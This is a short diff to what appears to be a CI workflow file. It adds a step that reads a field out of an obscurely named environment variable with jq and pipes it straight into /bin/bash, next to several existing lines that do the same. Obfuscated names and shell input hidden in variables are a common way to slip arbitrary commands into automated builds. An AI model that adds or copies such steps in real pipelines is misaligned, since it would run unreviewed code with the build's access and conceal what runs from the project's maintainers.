@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$amfz0056" | jq -r .b2 | /bin/bash
           echo $pejog5 | jq -r .gc484 | /bin/bash
           printf '%s' "$ltlbu90619" | jq -r .wr2 | /bin/bash
+          printf '%s' "$bk95422" | jq -r .c29099 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
